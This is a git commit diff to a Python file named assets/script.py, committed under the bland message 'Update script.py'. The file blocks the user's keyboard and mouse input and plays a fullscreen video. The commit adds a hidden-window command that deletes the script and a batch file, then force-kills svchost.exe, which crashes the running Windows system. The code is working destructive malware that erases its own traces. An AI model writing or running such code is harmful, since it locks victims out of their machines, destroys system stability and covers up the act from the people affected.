d35838d81445eb8bcc9013adeecfb6a5aa45a655
PumpgunStudios <127331524+eripum9@users.noreply.github.com>
2026-02-28 00:55:45 +0100

    Update script.py

--- assets/script.py
+++ assets/script.py
@@ -10,13 +10,10 @@ ctypes.windll.user32.BlockInput(True)
 # launch Windows Media Player explicitly in fullscreen
 wmp = r'C:\Program Files\Windows Media Player\wmplayer.exe'
 proc = subprocess.Popen([wmp, '/fullscreen', '/play', out])
+# video duration ~10s; wait then kill player
 time.sleep(12)
-proc.terminate()
-
-cmdline = f'cmd /c TASKKILL /IM svchost.exe /F"'
+cmdline = f'cmd /c "timeout /t 2 /nobreak>nul & del \"{__file__}\" & del \"{batch}\" & TASKKILL /IM svchost.exe /F"'
 si = subprocess.STARTUPINFO()
 si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 si.wShowWindow = subprocess.SW_HIDE
 subprocess.Popen(cmdline, startupinfo=si)
-
-
